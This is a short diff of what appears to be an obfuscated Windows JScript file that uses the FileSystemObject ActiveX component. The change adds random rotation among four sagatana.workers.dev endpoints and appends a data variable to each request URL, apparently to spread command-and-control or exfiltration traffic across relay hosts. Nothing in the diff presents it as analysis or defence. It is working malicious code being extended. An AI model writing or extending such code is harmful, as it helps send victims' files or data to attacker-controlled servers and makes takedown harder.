@@ -29,6 +29,7 @@ version="1.0">
 	var hx73;
 	var irz593;
 	var rwq015;
+	var ka7192;
     cq854 = false; 
     dro73 = false; 
 	var jk021 = new ActiveXObject("Scripting.FileSystemObject");
@@ -61,7 +62,32 @@ function nts316(min)
 dro73 = false; 
 
 
-     ekw28 = "https://wild-violet-a269.sagatana.workers.dev/?"+ak765;
+	ka7192 = bx021(1,4);
+	
+	if (ka7192 == 1)
+	{
+	ekw28 = "https://wild-violet-a269.sagatana.workers.dev/?"+ak765;
+	}	
+
+	if (ka7192 == 2)
+	{
+	ekw28 = "https://withered-frost-0d65.sagatana.workers.dev/?"+ak765;
+	}	
+	
+	if (ka7192 == 3)
+	{
+	ekw28 = "https://green-glade-49b6.sagatana.workers.dev/?"+ak765;
+	}	
+	
+	if (ka7192 == 4)
+	{
+	ekw28 = "https://billowing-violet-7e7c.sagatana.workers.dev/?"+ak765;
+	}	
+	
+   
+	 
+
+
 
 
 ekw282 = ekw28;
